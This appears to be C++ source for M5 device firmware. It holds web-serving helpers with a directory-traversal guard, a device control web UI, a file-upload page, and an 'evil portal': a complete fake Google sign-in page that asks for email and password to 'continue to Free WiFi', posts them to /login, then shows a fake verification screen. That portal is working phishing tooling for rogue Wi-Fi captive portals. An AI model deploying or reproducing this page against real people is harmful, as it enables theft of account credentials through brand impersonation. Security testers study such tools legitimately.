String getContentType(String path) {
	path.toLowerCase();
	if (path.endsWith(".html") || path.endsWith(".htm")) return "text/html";
	if (path.endsWith(".css")) return "text/css";
	if (path.endsWith(".js")) return "application/javascript";
	if (path.endsWith(".png")) return "image/png";
	if (path.endsWith(".jpg") || path.endsWith(".jpeg")) return "image/jpeg";
	if (path.endsWith(".gif")) return "image/gif";
	if (path.endsWith(".svg")) return "image/svg+xml";
	if (path.endsWith(".ico")) return "image/x-icon";
	if (path.endsWith(".json")) return "application/json";
	return "text/plain";
}

/**
 * @brief Normalize a path string by resolving "." and ".." segments
 *        and collapsing multiple consecutive slashes.
 * @param path The raw path (must start with "/")
 * @return Normalized path, or "" if path attempts to escape above the filesystem root
 */
static String _normalizeFsPath(const String& path) {
	if (path.length() == 0 || path[0] != '/') return "";

	String result = "/";
	int len = path.length();
	int i = 1; // skip leading "/"

	while (i < len) {
		int nextSlash = path.indexOf('/', i);
		if (nextSlash < 0) nextSlash = len;

		if (nextSlash > i) { // non-empty segment
			String seg = path.substring(i, nextSlash);
			if (seg == ".") {
				// skip
			} else if (seg == "..") {
				int lastSlash = result.lastIndexOf('/');
				if (lastSlash == 0) {
					// Already at root — traversal attempt above "/"
					return "";
				}
				result = result.substring(0, lastSlash);
			} else {
				if (result != "/") result += "/";
				result += seg;
			}
		}
		// else: empty segment means "//" — skip

		i = nextSlash + 1;
	}

	if (result.length() == 0) result = "/";
	return result;
}

/**
 * @brief Extract the directory part of a file path.
 *        "/portals/google/index.html" -> "/portals/google/"
 *        "/index.html" -> "/"
 */
static String _getDirPath(const String& filePath) {
	int lastSlash = filePath.lastIndexOf('/');
	if (lastSlash <= 0) return "/";
	return filePath.substring(0, lastSlash + 1);
}

/**
 * @brief Resolve a requested URI relative to the web root directory.
 *        Strips the leading "/" from URI, joins it with the base directory,
 *        normalizes the result, and verifies the result stays within the base directory.
 * @param uri The HTTP request URI (e.g., "/style.css" or "/../creds.txt")
 * @param baseDir The directory containing the HTML file (e.g., "/portals/google/")
 * @return Normalized absolute path within baseDir, or "" if traversal attempt is detected
 */
static String _resolveFsPath(const String& uri, const String& baseDir) {
	// Strip leading "/" so the URI is treated as relative to baseDir (the web root)
	String relative = uri.startsWith("/") ? uri.substring(1) : uri;
	String combined = baseDir + relative;
	String normalized = _normalizeFsPath(combined);

	// Block traversal: normalized path must start with the base directory
	if (normalized.length() == 0) return "";
	if (!normalized.startsWith(baseDir)) {
		return "";
	}
	return normalized;
}

String mainHTML() {
	String html = "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>M5-power-firmware</title><link rel=\"stylesheet\" href=\"style.css\"></head><body><h1>M5 power firmware</h1><div class=\"screen\"><div class=\"menu-screen\"></div><div class=\"function-screen\"></div></div><div class=\"controls\"><div><button class=\"control-btn btn-up\">↑</button><button class=\"control-btn btn-down\">↓</button></div><div><button class=\"control-btn btn-a\">A</button><button class=\"control-btn btn-b\">B</button></div></div><div class=\"controls\"><button class=\"control-btn btn-update\">↻</button></div><script src=\"index.js\"></script></body></html>";
	return html;
}

String mainCSS() {
	String css = "body {background: rgb(25, 25, 25);font-family: Arial, Helvetica, sans-serif;color: rgb(200, 255, 0);margin: 0;}h1 {text-transform: uppercase;text-align: center;}.container {margin: 0 auto;max-width: 600px;}.screen {margin: 20px auto;background: black;width: 80%;aspect-ratio: 2/1;overflow: hidden;max-width: 600px;}.menu-screen {height: fit-content;}.function-screen {height: 100%;display: flex;flex-direction: column;justify-content: center;}.controls {max-width: 600px;width: 80%;margin: 0 auto;display: flex;justify-content: space-around;}.control-btn {display: block;width: 80px;aspect-ratio: 1/1;background: transparent;border: 1px solid rgb(200, 255, 0);color: rgb(200, 255, 0);font-size: 50px;cursor: pointer;margin-top: 30px;}.menu-item {color: #fff;font-size: 40px;}.active {background: #fff;color: #000;}.small {font-size: 20px;}.medium {font-size: 30px;}.big {font-size: 40px;}.function-item.left {margin-left: 20px;}.center {text-align: center;}.right {text-align: right;}";
	return css;
}

String mainJS() {
	String js = "const screen = document.querySelector('.screen');const menuScreen = screen.querySelector('.menu-screen');const functionScreen = screen.querySelector('.function-screen');let currentData = '';let cursor = 0;document.querySelector('.btn-up').addEventListener('click', () => {sendToServer({data: 'up'}).then(res => res.text()).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));});document.querySelector('.btn-down').addEventListener('click', () => {sendToServer({data: 'down'}).then(res => res.text()).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));});document.querySelector('.btn-a').addEventListener('click', () => {sendToServer({data: 'a'}).then(res => res.text()).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));});document.querySelector('.btn-b').addEventListener('click', () => {if (currentData.type === \"function\") {sendToServer({data: 'b'}).then(sendToServer({data: 'update'}).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res))));} else sendToServer({data: 'b'}).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));});document.querySelector('.btn-update').addEventListener('click', () => {sendToServer({data: 'update'}).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));});function parse(dataString) {dataString = dataString.replace(/;$/, '');const type = dataString.split(\";\")[0];if (type === \"menu\") {const cursor = Number(dataString.split(\";\")[1]);const menuItems = dataString.split(\";\").slice(2);return {type,cursor,menuItems: menuItems.map(e => e.split(\",\")),}} else if (type === \"function\") {const functionItems = dataString.split(\";\").slice(1);return {type,functionItems: functionItems.map(e => e.split(\",\")),}}}function draw(data) {clearScreen();currentData = parse(data);/* if (currentData.cursor === currentData.menuItems.length) cursor = 0; *//* if (currentData.cursor < 0) cursor = menuItems.length - 1; */if (currentData.type === \"menu\") {currentData.menuItems.forEach((e, i) => {const name = e[0];const htmlEl = document.createElement('div');htmlEl.innerText = `\u00A0${name}`;htmlEl.className = 'menu-item';if (i === currentData.cursor) {htmlEl.classList.add('active');}menuScreen.append(htmlEl);});} else if (currentData.type === \"function\") {currentData.functionItems.forEach((e, i) => {const text = e[0];const size = calcTextSize(e[1]);const align = e[2];const htmlEl = document.createElement('div');htmlEl.innerHTML = `${text}`;htmlEl.className = `function-item ${size} ${align}`;functionScreen.append(htmlEl);});}}function calcTextSize(sizeNum) {switch (Number(sizeNum)) {case 1:return \"small\";case 2:return \"medium\";case 3:return \"big\";}}function clearScreen() {functionScreen.innerHTML = '';menuScreen.innerHTML = '';}async function sendToServer(argsObject) {const formData = new FormData();const args = Object.entries(argsObject);for (const [key, value] of args) {formData.append(key, value);};return await fetch('/post', {method: 'POST', body: formData});}sendToServer({data: 'update'}).then(sendToServer({data: 'get'}).then(res => res.text()).then(res => draw(res)));";
	return js;
}

String evilPortalHTML() {
	String html = "<!DOCTYPE html><html lang=\"en\"><head>  <meta charset=\"UTF-8\">  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">  <title>Sign in — Google</title>  <style>    * { margin: 0; padding: 0; box-sizing: border-box; }    body {      font-family: \"Google Sans\", Roboto, Arial, sans-serif;      background: #fff;      min-height: 100vh;      display: flex;      flex-direction: column;      align-items: center;      padding: 48px 24px;    }    .logo {      margin-bottom: 32px;      font-size: 28px;      font-weight: 500;      letter-spacing: -0.5px;    }    .logo .blue   { color: #4285F4; }    .logo .red    { color: #EA4335; }    .logo .yellow { color: #FBBC05; }    .logo .green  { color: #34A853; }    .card {      border: 1px solid #dadce0;      border-radius: 8px;      padding: 48px 40px 36px;      max-width: 400px;      width: 100%;    }    h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }    .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }    .field {      margin-bottom: 24px;    }    .field input {      width: 100%;      padding: 14px 12px;      border: 1px solid #dadce0;      border-radius: 4px;      font-size: 16px;      outline: none;      color: #202124;    }    .field input:focus {      border-color: #1a73e8;      box-shadow: 0 0 0 1px #1a73e8;    }    .field input::placeholder { color: #80868b; }    .actions {      display: flex;      justify-content: space-between;      align-items: center;    }    .btn {      background: #1a73e8;      color: #fff;      border: none;      border-radius: 4px;      padding: 10px 24px;      font-size: 14px;      font-weight: 500;      letter-spacing: 0.25px;      cursor: pointer;    }    .btn:hover { background: #1765cc; }    .btn:active { background: #1557b0; }    .footer {      margin-top: 24px;      font-size: 12px;      color: #5f6368;      display: flex;      gap: 24px;    }  </style></head><body>  <div class=\"logo\">    <span class=\"blue\">G</span><span class=\"red\">o</span><span class=\"yellow\">o</span><span class=\"green\">g</span><span class=\"blue\">l</span><span class=\"red\">e</span>  </div>  <div class=\"card\">    <h1>Sign in</h1>    <p class=\"subtitle\">to continue to Free WiFi</p>    <form method=\"POST\" action=\"/login\">      <div class=\"field\">        <input type=\"email\" name=\"email\" placeholder=\"Email or phone\" required autofocus>      </div>      <div class=\"field\">        <input type=\"password\" name=\"password\" placeholder=\"Enter your password\" required>      </div>      <div class=\"actions\">        <div></div>        <button type=\"submit\" class=\"btn\">Next</button>      </div>    </form>  </div>  <div class=\"footer\">    <span>Help</span>    <span>Privacy</span>    <span>Terms</span>  </div></body></html>";
	return html;
}

String evilPortalSuccessHTML() {
	String html = "<!DOCTYPE html><html lang=\"en\"><head>  <meta charset=\"UTF-8\">  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">  <title>Google</title>  <style>    * { margin: 0; padding: 0; box-sizing: border-box; }    body {      font-family: \"Google Sans\", Roboto, Arial, sans-serif;      background: #fff;      min-height: 100vh;      display: flex;      flex-direction: column;      align-items: center;      padding: 48px 24px;    }    .logo {      margin-bottom: 32px;      font-size: 28px;      font-weight: 500;      letter-spacing: -0.5px;    }    .logo .blue   { color: #4285F4; }    .logo .red    { color: #EA4335; }    .logo .yellow { color: #FBBC05; }    .logo .green  { color: #34A853; }    .card {      border: 1px solid #dadce0;      border-radius: 8px;      padding: 48px 40px 36px;      max-width: 400px;      width: 100%;      text-align: center;    }    .spinner {      width: 32px; height: 32px;      margin: 0 auto 24px;      border: 3px solid #dadce0;      border-top-color: #1a73e8;      border-radius: 50%;      animation: spin 0.8s linear infinite;    }    @keyframes spin { to { transform: rotate(360deg); } }    h1 { font-size: 16px; font-weight: 400; color: #202124; }    .subtitle { font-size: 14px; color: #5f6368; margin-top: 8px; }  </style></head><body>  <div class=\"logo\">    <span class=\"blue\">G</span><span class=\"red\">o</span><span class=\"yellow\">o</span><span class=\"green\">g</span><span class=\"blue\">l</span><span class=\"red\">e</span>  </div>  <div class=\"card\">    <div class=\"spinner\"></div>    <h1>Verifying...</h1>    <p class=\"subtitle\">You may now close this page</p>  </div></body></html>";
	return html;
}

String lfsWebUIHTML() {
	String html = "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Crystal firmware</title><link rel=\"stylesheet\" href=\"lfs_web_ui.css\"></head><body><div class=\"header\"><h1>LFS WEB UI</h1><span class=\"badge\">LittleFS</span></div><div class=\"main\"><div class=\"card\"><div class=\"card-header\">Upload File</div><div class=\"card-body\"><form method=\"POST\" action=\"/upload\" enctype=\"multipart/form-data\" class=\"upload-form\"><input type=\"file\" name=\"file\" required><button type=\"submit\" class=\"btn\">Upload</button></form></div></div><div class=\"card\"><div class=\"card-header\">Files</div><div class=\"card-body\"><ul class=\"file-list\">FILE_LIST_PLACEHOLDER</ul></div></div></div><div class=\"footer\"><a href=\"/\">&#x27F3; Refresh</a></div></body></html>";
	return html;
}

String lfsWebUICSS() {
	String css = "* {margin: 0;padding: 0;box-sizing: border-box;}body {font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;background: #0d1117;color: #c9d1d9;min-height: 100vh;display: flex;flex-direction: column;}.header {background: #161b22;border-bottom: 1px solid #30363d;padding: 0 24px;height: 56px;display: flex;align-items: center;justify-content: space-between;flex-shrink: 0;}.header h1 {font-size: 18px;font-weight: 600;color: #f0f6fc;letter-spacing: -0.3px;}.header .badge {background: #1f6feb33;color: #58a6ff;border: 1px solid #1f6feb66;border-radius: 12px;font-size: 11px;font-weight: 500;padding: 3px 10px;}.main {flex: 1;max-width: 720px;width: 100%;margin: 0 auto;padding: 28px 24px;display: flex;flex-direction: column;gap: 24px;}.card {background: #161b22;border: 1px solid #30363d;border-radius: 8px;overflow: hidden;}.card-header {background: #1c2128;border-bottom: 1px solid #30363d;padding: 14px 20px;font-size: 14px;font-weight: 600;color: #f0f6fc;}.card-body {padding: 20px;}.upload-form {display: flex;gap: 10px;align-items: center;flex-wrap: wrap;}.upload-form input[type=\"file\"] {flex: 1;min-width: 200px;color: #8b949e;font-size: 13px;}.upload-form input[type=\"file\"]::file-selector-button {background: #21262d;color: #c9d1d9;border: 1px solid #30363d;border-radius: 6px;padding: 7px 14px;font-size: 13px;cursor: pointer;margin-right: 10px;transition: background .15s;}.upload-form input[type=\"file\"]::file-selector-button:hover {background: #30363d;}.btn {background: #238636;color: #fff;border: 1px solid #2ea043;border-radius: 6px;padding: 8px 18px;font-size: 13px;font-weight: 500;cursor: pointer;transition: background .15s;text-decoration: none;display: inline-block;}.btn:hover {background: #2ea043;}.btn-outline {background: #21262d;border-color: #30363d;color: #c9d1d9;}.btn-outline:hover {background: #30363d;}.btn-danger {background: #21262d;border-color: #30363d;color: #f85149;font-size: 11px;padding: 4px 10px;}.btn-danger:hover {background: #da3633;border-color: #da3633;color: #fff;}.file-list {list-style: none;}.file-list li {display: flex;align-items: center;justify-content: space-between;padding: 12px 0;border-bottom: 1px solid #21262d;gap: 12px;}.file-list li:last-child {border-bottom: none;}.file-list .file-link {color: #58a6ff;text-decoration: none;font-size: 14px;word-break: break-all;min-width: 0;}.file-list .file-link:hover {text-decoration: underline;}.file-list .file-meta {display: flex;align-items: center;gap: 12px;flex-shrink: 0;}.file-list .file-size {color: #8b949e;font-size: 12px;white-space: nowrap;}.file-empty {color: #484f58;font-size: 14px;text-align: center;padding: 20px 0;}.footer {border-top: 1px solid #30363d;padding: 16px 24px;text-align: center;flex-shrink: 0;}.footer a {color: #8b949e;text-decoration: none;font-size: 13px;transition: color .15s;}.footer a:hover {color: #c9d1d9;}";
	return css;
}